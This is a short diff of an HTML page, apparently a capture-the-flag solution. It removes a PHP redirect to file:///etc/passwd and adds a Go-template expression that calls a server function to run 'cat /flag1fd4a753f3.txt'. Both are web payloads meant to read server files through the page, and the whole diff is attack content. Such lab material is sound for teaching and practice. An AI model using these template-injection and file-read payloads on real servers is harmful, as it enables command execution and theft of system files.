@@ -1,10 +1,9 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>
-System Command Output:
-</h1>
-<?phpheader('location:file:///etc/passwd');
-?>
+<h2>Get Flag</h2>
+    <ul>
+        <li>Flag: {{.FetchServerInfo "cat /flag1fd4a753f3.txt"}}</li>
+    </ul>
 </body>
 </html>
